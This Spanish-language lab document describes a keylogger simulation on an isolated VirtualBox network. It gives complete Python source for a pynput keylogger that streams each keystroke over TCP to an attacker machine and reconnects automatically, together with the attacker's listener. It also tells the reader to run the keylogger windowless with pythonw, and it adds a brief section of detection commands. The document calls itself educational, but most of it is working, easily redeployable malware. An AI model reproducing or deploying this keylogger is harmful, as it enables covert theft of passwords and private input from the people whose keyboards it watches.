
# DOCUMENTACIÓN - SIMULACIÓN DE KEYLOGGER EN VLAN

## Objetivo del Proyecto

Demostrar cómo funciona un keylogger básico en un entorno controlado de laboratorio, mostrando la captura de teclas en tiempo real desde una máquina víctima hacia una máquina atacante dentro de una VLAN aislada.

---

## Arquitectura del Sistema
```
┌─────────────────┐         Socket TCP         ┌─────────────────┐
│   PC VÍCTIMA    │ ─────────────────────────> │   PC ATACANTE   │
│  192.168.1.69   │      Puerto 4444           │  192.168.1.68   │
│                 │                            │                 │
│ keylogger.py    │   Envío de teclas          │  listener.py    │
│ (Captura)       │   en tiempo real           │  (Recepción)    │
└─────────────────┘                            └─────────────────┘
```

---

## CÓDIGO 1: Atacante.py (Listener)

### Propósito
Recibir y mostrar en tiempo real todas las pulsaciones de teclas capturadas por el keylogger de la víctima.

### Código Completo
```python
import socket

print(r"""
+--------------------------------------------------+
|                                                  |
|                 KEYLOGGER LISTENER               |
|                                                  |
+--------------------------------------------------+
""")

s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)

conn, addr = s.accept()
print(f"Dispositivo conectado desde >  {addr[0]}")
print("#"*50)
print("Captura en tiempo real: \n")

while True:
    try:
        data = conn.recv(1024)
        if not data:
            print("\n\nConexión cerrada")
            break
        
        print(data.decode('utf-8', errors='ignore'), end='', flush=True)
    
    except KeyboardInterrupt:
        print("\n\nListener detenido")
        break
    except:
        print("\n\nError en conexión")
        break

conn.close()
s.close()
```

### Funcionamiento

1. Crea un socket TCP/IP
2. Vincula el socket al puerto 4444 en todas las interfaces de red
3. Espera una conexión entrante de la víctima
4. Acepta la conexión y muestra la IP del cliente conectado
5. Entra en un bucle infinito que recibe datos continuamente
6. Decodifica los bytes recibidos a texto UTF-8
7. Muestra las teclas capturadas en tiempo real sin saltos de línea
8. Maneja la desconexión del cliente o interrupción por teclado
9. Cierra las conexiones correctamente al finalizar

---

## CÓDIGO 2: keylogger.py (Víctima)

### Propósito
Capturar cada pulsación de tecla en el sistema víctima y enviarla en tiempo real al atacante.

### Código Completo
```python
from pynput import keyboard
import socket
import time

ATACANTE_IP = "192.168.1.68"
ATACANTE_PUERTO = 4444

def conectar():
    while True:
        try:
            s = socket.socket()
            s.connect((ATACANTE_IP, ATACANTE_PUERTO))
            return s
        except:
            time.sleep(3)

conexion = conectar()

def al_presionar(tecla):
    global conexion
    
    try:
        letra = tecla.char
    except AttributeError:
        if tecla == keyboard.Key.space:
            letra = ' '
        elif tecla == keyboard.Key.enter:
            letra = '\n'
        elif tecla == keyboard.Key.backspace:
            letra = '[BACK]'
        elif tecla == keyboard.Key.tab:
            letra = '[TAB]'
        else:
            letra = f'[{tecla.name}]'
    
    try:
        conexion.send(letra.encode('utf-8'))
    except:
        conexion = conectar()
        conexion.send(letra.encode('utf-8'))

listener = keyboard.Listener(on_press=al_presionar)
listener.start()
listener.join()
```

### Funcionamiento

1. Define las credenciales del servidor atacante (IP y puerto)
2. La función `conectar()` intenta establecer conexión TCP con reintentos automáticos cada 3 segundos
3. Se establece una conexión persistente al iniciar el script
4. La función `al_presionar()` se ejecuta como callback cada vez que se presiona una tecla
5. Extrae el carácter de la tecla presionada (letras, números, símbolos)
6. Maneja teclas especiales (espacio, enter, backspace, tab, etc.) con etiquetas descriptivas
7. Codifica cada tecla a bytes UTF-8 y la envía inmediatamente por el socket
8. Si la conexión falla, reconecta automáticamente y reenvía la tecla
9. El listener de teclado se ejecuta indefinidamente en un hilo separado

---

## Flujo de Datos
```
Usuario presiona tecla → pynput detecta evento → Función callback ejecuta → 
Tecla convertida a string → Codificación UTF-8 → Envío por socket TCP → 
Transmisión por red → Atacante recibe bytes → Decodificación UTF-8 → 
Visualización en pantalla
```

---

## Requisitos Técnicos

### PC Atacante (Kali Linux)
- Python 3.8+
- Librería `socket` (incluida por defecto)
- IP estática: 192.168.1.68

### PC Víctima (Windows)
- Python 3.8+
- Librería `pynput`: `pip install pynput`
- IP estática: 192.168.1.69

### Red
- VirtualBox con Red Interna configurada
- Nombre de red: `vlan_lab`
- Rango: 192.168.1.0/24
- Sin gateway (red aislada)

---

## Ejecución

### Paso 1: Iniciar Listener (Atacante)
```bash
python Atacante.py
```

### Paso 2: Ejecutar Keylogger (Víctima)
```bash
pythonw keylogger.pyw
```

### Paso 3: Observar Captura
Todas las teclas presionadas en la víctima aparecerán en tiempo real en la terminal del atacante.

---

## Detección

### Comando para ver conexiones activas en la víctima
```bash
netstat -ano | findstr 4444
```

### Filtro de Wireshark
```
tcp.port == 4444
```

### Ver procesos Python en ejecución
```bash
tasklist | findstr python
```

---

## Entorno de Laboratorio
```
Plataforma: VirtualBox
Red: Red Interna (vlan_lab)
VM1 (Atacante): Kali Linux - 192.168.1.68/24
VM2 (Víctima): Windows 10 - 192.168.1.69/24
Puerto: 4444 TCP
Protocolo: Socket TCP/IP sin cifrado
```

---


## Notas

Este proyecto es exclusivamente para fines educativos en entornos controlados de laboratorio. Demuestra los principios de captura de eventos del sistema, comunicaciones cliente-servidor con sockets y transmisión de datos en tiempo real.
